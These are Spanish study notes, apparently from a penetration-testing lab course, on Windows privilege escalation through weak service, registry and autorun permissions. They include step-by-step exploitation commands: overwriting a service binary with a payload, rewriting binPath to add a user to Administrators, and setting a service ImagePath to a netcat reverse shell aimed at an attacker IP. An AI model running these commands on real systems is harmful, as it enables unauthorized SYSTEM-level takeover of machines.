
## 🧠 Concepto clave
Los permisos en Windows son complejos y difíciles de configurar correctamente. Un error en un punto puede introducir vulnerabilidades en otro. Esta sección cubre cuatro vectores de escalada basados en permisos débiles: **ACLs permisivas sobre binarios de servicios**, **permisos débiles sobre la configuración del servicio**, **rutas de servicio sin comillas**, y **ACLs permisivas en el registro**. Dado que los servicios suelen correr como SYSTEM, explotar cualquiera de estos vectores puede llevar al control total del sistema. En entornos reales estos fallos son especialmente frecuentes en software de terceros, aplicaciones open source y desarrollos internos.

## 📌 Puntos importantes

### Vector 1 — ACLs permisivas sobre binarios de servicios

Si el ejecutable de un servicio tiene permisos de escritura para grupos amplios como `Everyone` o `BUILTIN\Users`, cualquier usuario del sistema puede **reemplazarlo directamente por un binario malicioso**. La próxima vez que el servicio arranque, ejecutará ese binario en el contexto de la cuenta del servicio — habitualmente SYSTEM. Es el vector más directo de los cuatro: no requiere modificar configuración ni registro, solo sobreescribir un archivo.

El caso del apunte involucra **SecurityService.exe**, el binario del servicio *PC Security Management Service* (`SecurityService`), instalado por el software PCProtect. A pesar de ser un servicio de seguridad, su binario tiene permisos `Full Control` para `Everyone` y `BUILTIN\Users` — cualquier usuario sin privilegios puede reemplazarlo. Además, el servicio es startable por usuarios sin privilegios, lo que permite ejecutar el ataque completo sin interacción del administrador.

### Vector 2 — Permisos débiles sobre la configuración del servicio

Distinto al anterior — aquí no se reemplaza ningún archivo. Si un usuario tiene `SERVICE_ALL_ACCESS` o `SERVICE_CHANGE_CONFIG` sobre un servicio, puede **modificar el campo `binPath`** de su configuración para que ejecute cualquier comando arbitrario como SYSTEM. El servicio fallará al arrancar (porque el nuevo binPath no apunta a un ejecutable de servicio real), pero el comando se habrá ejecutado igualmente antes del timeout.

El caso del apunte involucra **WindscribeService**, el servicio del cliente VPN Windscribe. Cualquier usuario autenticado (`NT AUTHORITY\Authenticated Users`) tiene `SERVICE_ALL_ACCESS` sobre él — control total para leer, modificar, arrancar y parar el servicio.

Un caso real documentado de este mismo patrón es **CVE-2019-1322** 📄 [CVE-2019-1322 — MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), que afectaba al **Windows Update Orchestrator Service (UsoSvc)** 📄 [Cómo funciona Windows Update — Microsoft Docs](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works) — un servicio esencial del sistema que corre como SYSTEM y que antes del parche permitía a cuentas de servicio modificar su binPath y arrancar/parar el servicio para escalar privilegios.

> [!important] Añadirse a un grupo no tiene efecto en la sesión actual. El token de seguridad se genera al iniciar sesión y no se actualiza dinámicamente. Para que la nueva membresía sea efectiva hay que generar una nueva sesión:
> ```cmd
> runas /user:INLANEFREIGHT\htb-student cmd
> ```
> `runas` — Lanza un nuevo proceso generando un token de seguridad actualizado con los grupos actuales del usuario.
> `/user:INLANEFREIGHT\htb-student` — Usuario con el que se abrirá la nueva sesión.
> `cmd` — Proceso a lanzar con el token actualizado.

### Vector 3 — Unquoted Service Paths

Cuando la ruta al binario de un servicio **no está entre comillas** y contiene espacios, Windows no sabe dónde termina el nombre del ejecutable y dónde empiezan los argumentos. Para resolverlo, intenta múltiples interpretaciones de izquierda a derecha, añadiendo `.exe` a cada fragmento del path hasta encontrar algo ejecutable. Por ejemplo, para:
```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows intentará en este orden:
1. `C:\Program.exe`
2. `C:\Program Files (x86)\System.exe`
3. `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

Si un atacante puede crear un archivo en alguna de esas rutas intermedias, el servicio lo ejecutará como SYSTEM. La limitación práctica es que escribir en la raíz del disco o en Program Files requiere privilegios de administrador. Además, normalmente hace falta reiniciar el servicio o esperar al reinicio del sistema. Por eso, aunque es un hallazgo válido para incluir en el informe, **rara vez es explotable directamente** en la práctica.

### Vector 4 — ACLs permisivas en el Registro

Si un usuario tiene permisos de escritura sobre la **clave de registro de un servicio**, puede modificar directamente el valor `ImagePath` — que es exactamente lo mismo que cambiar el binPath, pero operando a nivel de registro en lugar de usar `sc config`. Este vector puede pasar más desapercibido ya que no modifica ningún archivo en disco ni la configuración visible del servicio desde `sc`.

### Vector 5 — Autoruns con binarios modificables

Los programas configurados para ejecutarse al inicio del sistema (autoruns) se registran en varias ubicaciones del registro de Windows. Si se tienen permisos de escritura sobre el binario de un autorun o sobre su clave de registro, se puede reemplazar o redirigir para que ejecute código malicioso la próxima vez que el usuario correspondiente inicie sesión — útil para persistencia o escalada horizontal.

---

### Herramientas de enumeración

> [!info] **SharpUp** 📄 [SharpUp — GhostPack](https://github.com/GhostPack/SharpUp/)
> Herramienta C# de la suite GhostPack que automatiza la búsqueda de vectores comunes de escalada de privilegios en Windows. Es esencialmente la versión C# de PowerUp, lo que la hace más evasiva frente a restricciones de PowerShell (como ConstrainedLanguageMode o AMSI). Entre sus comprobaciones incluye: servicios con binarios modificables, servicios con permisos débiles, rutas sin comillas, autoruns modificables, tokens con privilegios aprovechables y más. Su salida agrupa los hallazgos por categoría, facilitando la priorización durante un assessment.

> [!info] **icacls** 📄 [icacls — SS64](https://ss64.com/nt/icacls.html)
> Herramienta nativa de Windows para consultar y modificar las ACLs (Access Control Lists) de archivos y directorios NTFS. Muestra qué usuarios y grupos tienen qué tipo de acceso sobre un objeto, usando abreviaciones: `F` (Full Control), `M` (Modify), `RX` (Read & Execute), `R` (Read), `W` (Write). La `(I)` indica que el permiso es **heredado** del directorio padre, y la `(OI)`/`(CI)` indican herencia a objetos/contenedores hijos. En el contexto de escalada de privilegios, el hallazgo crítico es `BUILTIN\Users:(F)` o `Everyone:(F)` sobre el binario de un servicio — significa que cualquier usuario del sistema puede reemplazarlo.

> [!info] **AccessChk** 📄 [AccessChk — Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
> Herramienta de la suite Sysinternals que reporta los **permisos efectivos** sobre objetos de Windows: archivos, directorios, claves de registro, servicios, procesos y named pipes. A diferencia de `icacls`, puede consultar permisos directamente sobre servicios mostrando los derechos específicos de cada grupo usando la nomenclatura de la API de Windows (`SERVICE_ALL_ACCESS`, `SERVICE_CHANGE_CONFIG`, `KEY_ALL_ACCESS`, etc.). 📄 [Service Security and Access Rights — Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) Es la herramienta estándar para verificar si un usuario puede modificar un servicio sin necesitar ser administrador.

---

### Flujo de explotación — Vector 1: ACL permisiva sobre binario (SecurityService)

**Paso 1 — Identificar el servicio vulnerable con SharpUp**

> [!tip] Ejecutar SharpUp para identificar binarios de servicios modificables
> ```powershell
> .\SharpUp.exe audit
> ```
> `audit` — Ejecuta todas las comprobaciones disponibles. Buscar en la sección `Modifiable Service Binaries`. En el ejemplo aparece `SecurityService` con su binario en `C:\Program Files (x86)\PCProtect\SecurityService.exe`.

**Paso 2 — Verificar los permisos sobre el binario con icacls**

> [!tip] Comprobar los permisos ACL sobre el binario del servicio vulnerable
> ```powershell
> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
> ```
> Si la salida muestra `BUILTIN\Users:(I)(F)` o `Everyone:(I)(F)`, cualquier usuario del sistema tiene **Full Control** sobre el binario y puede reemplazarlo libremente.

**Paso 3 — Generar el payload, reemplazar el binario y arrancar el servicio**

Con msfvenom generar un payload (reverse shell o `net localgroup administrators <usuario> /add`) en formato `.exe`, copiarlo con el mismo nombre que el binario original y arrancar el servicio:

> [!tip] Reemplazar el binario del servicio con el payload malicioso e iniciarlo
> ```cmd
> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
> sc start SecurityService
> ```
> `copy /Y` — Copia el archivo origen al destino sobreescribiendo sin pedir confirmación. `SecurityService.exe` en el origen es el payload malicioso generado previamente.
> `sc start SecurityService` — Inicia el servicio, que ahora ejecutará el payload malicioso como SYSTEM.

---

### Flujo de explotación — Vector 2: Permisos débiles sobre configuración (WindscribeService)

**Paso 1 — Identificar el servicio con permisos débiles**

> [!tip] Ejecutar SharpUp para identificar servicios con configuración modificable
> ```powershell
> .\SharpUp.exe audit
> ```
> Buscar en la sección `Modifiable Services`. En el ejemplo aparece `WindscribeService` con su binario en `C:\Program Files (x86)\Windscribe\WindscribeService.exe`.

**Paso 2 — Verificar los permisos con AccessChk**

> [!tip] Verificar los permisos efectivos sobre el servicio WindscribeService
> ```cmd
> accesschk.exe /accepteula -quvcw WindscribeService
> ```
> `/accepteula` — Acepta el EULA de Sysinternals automáticamente, necesario en la primera ejecución.
> `-q` — Omite el banner de la herramienta.
> `-u` — Suprime mensajes de error de acceso denegado.
> `-v` — Verbose, muestra los derechos específicos de cada grupo.
> `-c` — Indica que el argumento es el nombre de un servicio de Windows.
> `-w` — Muestra solo objetos sobre los que hay permisos de escritura.
> `NT AUTHORITY\Authenticated Users: SERVICE_ALL_ACCESS` en la salida confirma control total sobre el servicio para cualquier usuario autenticado del sistema.

**Paso 3 — Modificar el binPath, detener e iniciar el servicio**

> [!tip] Modificar el binPath del servicio para añadir el usuario actual a Administrators
> ```cmd
> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
> ```
> `config WindscribeService` — Modifica la configuración del servicio especificado.
> `binpath=` — Redefine el ejecutable que lanzará el servicio al iniciarse. El espacio tras `=` es obligatorio para que `sc` lo interprete correctamente.
> `"cmd /c net localgroup administrators htb-student /add"` — Comando que se ejecutará como SYSTEM. Puede sustituirse por cualquier otro comando, ruta a una reverse shell, etc.

> [!tip] Detener e iniciar WindscribeService para ejecutar el comando malicioso
> ```cmd
> sc stop WindscribeService
> sc start WindscribeService
> ```
> `sc stop` — Detiene el servicio activo. Necesario para que el nuevo binPath tenga efecto al arrancar.
> `sc start` — Inicia el servicio con el nuevo binPath. Fallará con error 1053 (timeout), pero el comando se habrá ejecutado como SYSTEM antes de que se produzca el fallo.

> [!tip] Verificar que el usuario fue añadido al grupo local Administrators
> ```cmd
> net localgroup administrators
> ```

**Limpieza — Restaurar el binPath original**

> [!tip] Restaurar la configuración original del servicio tras el ataque
> ```cmd
> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
> sc start WindScribeService
> sc query WindScribeService
> ```
> `sc config ... binpath=` — Restaura el ejecutable legítimo del servicio.
> `sc start` — Reinicia el servicio para dejarlo operativo.
> `sc query` — Verifica que el servicio está en estado `RUNNING` tras la restauración.

---

### Flujo de explotación — Vector 3: Unquoted Service Path

**Paso 1 — Buscar servicios con rutas sin comillas**

> [!tip] Identificar servicios con autostart y rutas sin comillas
> ```cmd
> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
> ```
> `wmic service get name,displayname,pathname,startmode` — Lista todos los servicios del sistema con nombre, nombre visible, ruta del binario y modo de inicio.
> `findstr /i "auto"` — Filtra solo servicios configurados para arrancar automáticamente (`AUTO_START`).
> `findstr /i /v "c:\windows\\"` — Excluye servicios del directorio de Windows (generalmente no explotables por permisos).
> `findstr /i /v """` — Excluye rutas que ya están entre comillas. Los resultados restantes son candidatos vulnerables a unquoted service path.

**Paso 2 — Verificar la configuración del servicio**

> [!tip] Consultar la configuración del servicio con ruta sin comillas
> ```cmd
> sc qc SystemExplorerHelpService
> ```
> `qc` — Query Config. Muestra la configuración completa del servicio. Confirmar que `BINARY_PATH_NAME` contiene espacios y no está entre comillas, y que `SERVICE_START_NAME` es `LocalSystem`.

---

### Flujo de explotación — Vector 4: ACL permisiva en el Registro

**Paso 1 — Buscar claves de registro de servicios con permisos de escritura**

> [!tip] Buscar claves de servicios en el registro con permisos de escritura para el usuario actual
> ```cmd
> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
> ```
> `"mrb3n"` — Nombre del usuario del que se comprueban los permisos efectivos.
> `-k` — Indica que se auditan claves de registro en lugar de archivos o servicios.
> `-v` — Verbose, muestra los permisos detallados de cada clave.
> `-u` — Suprime errores de acceso denegado.
> `-q` — Omite el banner de la herramienta.
> `-s` — Búsqueda recursiva en todas las subclaves del path especificado.
> `-w` — Muestra solo claves sobre las que el usuario tiene permisos de escritura.
> `KEY_ALL_ACCESS` en la salida indica control total sobre esa clave — incluyendo la capacidad de modificar `ImagePath`.

**Paso 2 — Modificar el valor ImagePath de la clave vulnerable**

> [!tip] Cambiar el ImagePath del servicio vulnerable en el registro
> ```powershell
> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
> ```
> `-Path` — Ruta completa a la clave de registro del servicio a modificar.
> `-Name "ImagePath"` — Nombre del valor de registro que define el ejecutable del servicio. Equivalente al campo `BINARY_PATH_NAME` visible con `sc qc`.
> `-Value` — Nuevo valor a escribir. En este caso, `nc.exe` con `-e cmd.exe` establece una reverse shell que conectará a la IP y puerto del atacante cuando el servicio arranque.

> [!info] **nc.exe (Netcat para Windows)**
> Versión de Netcat compilada para Windows. Permite crear conexiones TCP/UDP bidireccionales desde la línea de comandos. En este contexto se usa con el flag `-e` para redirigir stdin/stdout de `cmd.exe` a través de la conexión de red, estableciendo una reverse shell. Al ejecutarse como SYSTEM a través del servicio comprometido, la shell resultante tendrá privilegios máximos.

---

### Flujo de explotación — Vector 5: Autorun con binario modificable

**Paso 1 — Enumerar programas de inicio del sistema**

> [!tip] Listar todos los programas configurados para ejecutarse al inicio del sistema
> ```powershell
> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
> ```
> `Get-CimInstance Win32_StartupCommand` — Consulta la clase WMI que contiene todos los programas de autorun registrados en el sistema, independientemente de su ubicación (HKLM, HKCU, carpetas de inicio, etc.).
> `select Name, command, Location, User` — Filtra los campos más relevantes: nombre del programa, comando completo con argumentos, clave de registro o carpeta donde está registrado, y usuario al que aplica.
> `fl` — Format-List, muestra cada objeto en formato vertical para mayor legibilidad.

Con la lista obtenida, usar `icacls` sobre cada binario referenciado para identificar si alguno es escribible. Si lo es, reemplazarlo por un payload malicioso que se ejecutará la próxima vez que el usuario correspondiente inicie sesión.

---

## 🔗 Relaciones / Contexto

Los permisos débiles sobre servicios son uno de los vectores de escalada más frecuentes en entornos reales, especialmente en software de terceros, herramientas de seguridad mal configuradas y aplicaciones internas. La distinción clave entre los vectores es el punto de ataque: el **binario** (Vector 1), la **configuración del servicio** (Vector 2), la **ambigüedad en la ruta** (Vector 3) o la **clave de registro** (Vector 4). Los cuatro llevan a ejecución como SYSTEM. Siempre limpiar tras el ataque, revertir los cambios realizados y documentarlos detalladamente en el informe.